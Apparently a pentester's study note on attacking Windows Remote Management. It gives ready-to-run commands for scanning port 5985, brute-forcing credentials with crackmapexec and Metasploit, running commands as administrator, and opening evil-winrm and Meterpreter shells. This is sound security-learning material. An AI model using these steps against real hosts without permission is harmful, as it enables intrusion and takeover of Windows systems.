- Windows Remote Management (WinRM) is a protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
- WinRM is typically used to:
	- remotely access and interact with windows hosts on a local network.
	- remotely access and execute commands on windows systems
- It uses TCP port 5985 and 5986 (HTTPS).

***
***
## Practical

#### Scan the Target
```
nmap IP
nmap -p5985 -sV IP
```

### `Crackmapexec`
##### To perform the Brute Force attack:
```
crackmapexec winrm IP -u wordlists/username -p passwd_wordlist 
```

##### To perform Arbitrary cmd on the target
```
crackmapexec winrm IP -u administrator -p password -x 'whoami'
```

##### To obtain a cmd shell
```
evil-winrm.rb -u administrator -p 'password' -i IP
```
### Metasploit
##### Brute Force to find valid Users and their Passwords
This is the first thing we need to do:
```
msfdb run
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set rhosts Target
set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
set password anything
run
```
Note: We are setting the PASSWORD because in the recent version of the `winrm_login` module, the PASSWORD option is required unless using Kerberos authentication. 

##### Checking `WinRM` supported Authentication Method
This is very important to know before we try to connect to the `WinRM` service. We need to use a valid authentication method while connecting to the service. 
```
use auxiliary/scanner/winrm/winrm_auth_methods
set rhosts Target
run
```

##### Execute Command on the Target
```
use auxiliary/scanner/winrm/winrm_cmd
set rhosts Target
set username administrator
set password passwd
set cmd whoami
run
```

##### Exploit Module to get Meterpreter Shell
```
use exploit/windows/winrm/winrm_script_exec
set rhosts Target
set username administrator
set password passwd
set force_vbs true
run
```
In Metasploit, `Force_VBS` is used in certain exploits to force the use of Visual Basic Script (VBS) for executing payloads. This can be particularly useful in environments where other scripting languages or methods might be restricted or less effective.